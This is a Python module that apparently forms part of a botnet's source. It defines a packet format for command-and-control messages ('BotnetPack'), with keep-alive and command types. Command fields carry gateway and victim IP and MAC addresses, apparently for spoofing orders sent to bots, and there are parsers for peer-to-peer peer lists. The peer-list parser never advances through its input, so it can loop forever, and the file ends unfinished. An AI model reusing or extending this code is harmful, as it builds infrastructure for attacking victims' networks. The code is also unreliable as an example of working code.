import struct
import socket

"""
[TYPE-4B 

ACT-1B | GATEWAY_IP-4B |  VICTIM_IP-4B | GATEWAY_MAC-6B | VICTIM_MAC-6B

ID/NUM-2B | DST_IP-4B | DST_PORT-2B | PDST_IP-4B | PDST_PORT-2B]
"""

COMMAND_FORMAT = 'BLL' + 'B' * 12
P2P_FORMAT = 'HLHLH'
SERIALIZATION_FORMAT = '<I' + COMMAND_FORMAT + P2P_FORMAT


def ip2int(str_adr):
    return struct.unpack("!I", socket.inet_aton(str_adr))[0]


def int2ip(n_adr):
    return socket.inet_ntoa(struct.pack("!I", n_adr))


class TYPES:
    NETWORK_SYNC_REQUEST = 2
    NETWORK_SYNC_REPLY = 3

    KEEP_ALIVE = 4
    KEEP_ALIVE_ACK = 5

    COMMAND = 6
    COMMAND_RESULT = 7


class Command:
    def __init__(self, act=0, g_ip=0, v_ip=0, g_mac='0' * 6, v_mac='0' * 6):
        self.act = act
        self.g_ip = g_ip
        self.v_ip = v_ip
        self.g_mac = g_mac
        self.v_mac = v_mac


class P2PCommunication:
    def __init__(self, id=0, dst_ip=0, dst_port=0, pdst_ip=0, pdst_port=0):
        self.id = id
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.pdst_ip = pdst_ip
        self.pdst_port = pdst_port


class BotnetPack:
    def __init__(self, type, command, p2pCommunication):
        self.type = type
        self.command: Command = command
        self.p2p_communication: P2PCommunication = p2pCommunication

    def create_byte_stream(self, type):
        return struct.pack(SERIALIZATION_FORMAT,
                           type,
                           self.command.act,
                           self.command.g_ip,
                           self.command.v_ip,
                           int(self.command.g_mac[0], 16),
                           int(self.command.g_mac[1], 16),
                           int(self.command.g_mac[2], 16),
                           int(self.command.g_mac[3], 16),
                           int(self.command.g_mac[4], 16),
                           int(self.command.g_mac[5], 16),
                           int(self.command.v_mac[0], 16),
                           int(self.command.v_mac[1], 16),
                           int(self.command.v_mac[2], 16),
                           int(self.command.v_mac[3], 16),
                           int(self.command.v_mac[4], 16),
                           int(self.command.v_mac[5], 16),

                           self.p2p_communication.id,
                           self.p2p_communication.dst_ip,
                           self.p2p_communication.dst_port,
                           self.p2p_communication.pdst_ip,
                           self.p2p_communication.pdst_port
                           )


def get_type(data):
    return data[0]


def get_id(data):
    return int.from_bytes(data[25:27], 'little')


def get_ip_mac(r_data):
    ip_mac = {}
    data = r_data[struct.calcsize(SERIALIZATION_FORMAT):]

    ip = []
    mac = []
    v_c = 0

    while True:
        ip = '.'.join(map(str, list(map(int, data[v_c * 10:v_c * 10 + 4]))))
        mac = ''.join(map(hex, data[v_c * 10 + 4:v_c * 10 + 10])).replace('0x', '-')[1:]

        if ip.count('255') == 4:
            break

        ip_mac[ip] = mac
        v_c += 1

    return ip_mac

# creating packets
def keep_alive():
    return struct.pack(SERIALIZATION_FORMAT, TYPES.KEEP_ALIVE,
                       0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)


def get_peer_branches(data):
    z_lst = []

    data = data[struct.calcsize(SERIALIZATION_FORMAT) + 10:]

    while True:
        ip = data[:4]  # ip - 4bytes

        port = data[4:6]  # port - 2bytes

        # convert vars to different formats
        ip = int2ip(struct.unpack("!I", ip)[0])

        port = struct.unpack("!H", port)[0]

        # no more branches
        if port == 0:
            return z_lst

        # return the list
        z_lst.append((ip, port))


def get_base(data):
    """
    :return: (ip, port), num_branches
    """

    # remove the COVID-20 header
    data = data[struct.calcsize(SERIALIZATION_FORMAT):]

    ip = data[:4]  # ip - 4bytes

    port = data[4:6]  # port - 2bytes

    n_branches = data[6:10]  # n_branches - 4bytes

    # convert vars to different formats
    ip = int2ip(struct.unpack("!I", ip)[0])

    port = struct.unpack("!H", port)[0]

    n_branches = struct.unpack("!I", n_branches)[0]

    # return the base data
    return (ip, port), n_branches

## ???
